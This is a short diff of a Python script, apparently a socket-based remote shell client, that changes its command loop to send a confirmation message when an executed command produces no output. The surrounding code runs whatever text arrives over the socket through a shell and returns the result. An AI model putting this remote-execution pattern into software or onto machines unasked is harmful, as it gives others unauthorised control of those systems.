@@ -89,7 +89,15 @@ while True:
 
             out = subprocess.check_output(data, shell=True).decode('ascii')
 
-            socket.send(out.encode('ascii'))
+            if out == '':
+                
+                socket.send('Command Excuted!'.encode('ascii'))
+            
+            else:
+
+                socket.send(out.encode('ascii'))
+
+            continue
 
         except subprocess.CalledProcessError:
 
